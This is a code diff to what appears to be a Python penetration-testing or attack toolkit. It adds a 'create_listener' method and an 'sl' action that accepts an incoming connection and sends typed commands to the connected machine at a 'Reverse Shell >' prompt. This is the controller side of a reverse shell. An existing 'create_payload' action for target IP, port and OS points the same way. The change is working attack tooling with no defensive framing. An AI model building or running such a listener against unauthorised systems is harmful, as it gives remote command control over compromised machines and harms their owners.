@@ -18,6 +18,7 @@ functions -> Local functions file
 socket -> For port scanning
 os -> Operating System's Functionality
 requests -> Make HTTP requests
+sys -> System-specific parameters and functions
 """
 from termcolor import colored
 import json
@@ -25,6 +26,7 @@ import functions
 import socket
 import os
 import requests
+import sys
 
 class Action:
     """
@@ -208,6 +210,29 @@ class Action:
             self.log(file_name, content)
         return return_value
 
+    def create_listener(self, ip: str, port: str, logging: bool) -> int:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((ip, int(port)))
+        s.listen(1)
+        print(colored(f"INFO: Listening on {ip}:{port} ...", "blue"))
+        conn, addr = s.accept()
+        print(colored(f"SUCCESS: Connection from {addr} established.", "green"))
+        while True:
+            ans = conn.recv(1024).decode()
+            print(colored("RESPONSE: " + ans, "yellow"))
+            command = input("Reverse Shell > ")
+            if command == "exit":
+                conn.close()
+                functions.quit("INFO: Connection closed. Stopped the listener.")
+                break
+            command += "\n"
+            conn.send(command.encode())
+        if logging:
+            file_name = "result_cl_" + ip + "_" + port
+            content = str("Listening on " + ip + ":" + port)
+            self.log(file_name, content)
+        return 0
+
     def perform(self) -> int:
         """
         Performs the action.
@@ -225,5 +250,7 @@ class Action:
         elif self.__action == "cp":
             # Instructions for when the user wants to create a payload
             status = self.create_payload(ip=self.args[0], port=self.args[1], target_os=self.args[2], logging=is_log)
-
+        elif self.__action == "sl":
+            # Instructions for when the user wants to create a listener
+            status = self.create_listener(ip=self.args[0], port=self.args[1], logging=is_log)
         return status
